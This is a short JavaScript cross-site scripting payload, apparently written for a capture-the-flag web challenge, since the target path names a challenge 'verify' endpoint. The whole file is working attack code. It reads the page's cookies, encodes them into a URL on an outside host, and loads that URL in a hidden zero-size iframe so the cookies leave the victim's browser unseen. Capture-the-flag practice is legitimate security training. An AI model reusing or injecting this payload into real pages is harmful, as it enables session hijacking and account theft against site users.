(function(window, document) {
    var cookies = document.cookie;
    var xssURIBase = "https://chall.necst.it/challenges/web3/verify/411/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
   
    document.body.appendChild(hideFrame);
})(window, document);
